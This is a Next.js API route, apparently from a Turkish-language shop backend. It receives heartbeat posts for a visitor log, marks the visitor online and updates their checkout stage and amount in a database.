import { NextRequest, NextResponse } from 'next/server';
import connectDB from '@/lib/mongodb';
import { logsDb } from '@/lib/db';
import { enrichLogMetadata } from '@/lib/logEnrichment';
import { queryParam, readJsonBody } from '@/lib/readJsonBody';
import {
  hasCheckoutAddressEngagement,
  resolveCheckoutHeartbeatStatus,
  shouldApplyIncomingStatus,
} from '@/lib/logCategories';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

const noStoreHeaders = {
  'Cache-Control': 'no-store, no-cache, must-revalidate',
  Pragma: 'no-cache',
};

export async function POST(request: NextRequest) {
  try {
    await connectDB();
    const body = await readJsonBody(request);
    const logId =
      (typeof body.logId === 'string' ? body.logId.trim() : '') || queryParam(request, 'logId');

    if (!logId) {
      return NextResponse.json({ success: true, skipped: true }, { headers: noStoreHeaders });
    }

    const log = await logsDb.findById(logId);
    if (!log || log.pageType === 'admin') {
      return NextResponse.json({ success: true, skipped: true }, { headers: noStoreHeaders });
    }

    const pageType =
      (typeof body.pageType === 'string' ? body.pageType : undefined) || log.pageType;
    const metadata = enrichLogMetadata(request, body);
    const updateData: Record<string, unknown> = {
      onlineStatus: 'Aktif',
      ...metadata,
    };

    if (typeof body.amount === 'number') {
      updateData.amount = body.amount;
    }

    if (pageType === 'address' && hasCheckoutAddressEngagement(log)) {
      updateData.pageType = 'address';
      updateData.status = 'Adres Ekranında';
    } else if (pageType === 'payment' || pageType === 'processing' || pageType === 'waiting') {
      const nextStatus = resolveCheckoutHeartbeatStatus(pageType);
      updateData.pageType = pageType;
      if (nextStatus && shouldApplyIncomingStatus(log.status, nextStatus)) {
        updateData.status = nextStatus;
      }
    }

    const needsFullUpdate =
      typeof body.amount === 'number' ||
      (pageType === 'address' && hasCheckoutAddressEngagement(log)) ||
      pageType === 'payment' ||
      pageType === 'processing' ||
      pageType === 'waiting';

    const updated = needsFullUpdate
      ? await logsDb.updateById(log._id, updateData)
      : await logsDb.touchOnline(log._id);

    if (!updated) {
      return NextResponse.json({ success: true, skipped: true }, { headers: noStoreHeaders });
    }

    return NextResponse.json({ success: true, data: updated }, { headers: noStoreHeaders });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'Heartbeat başarısız';
    console.error('Log heartbeat hatası:', error);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
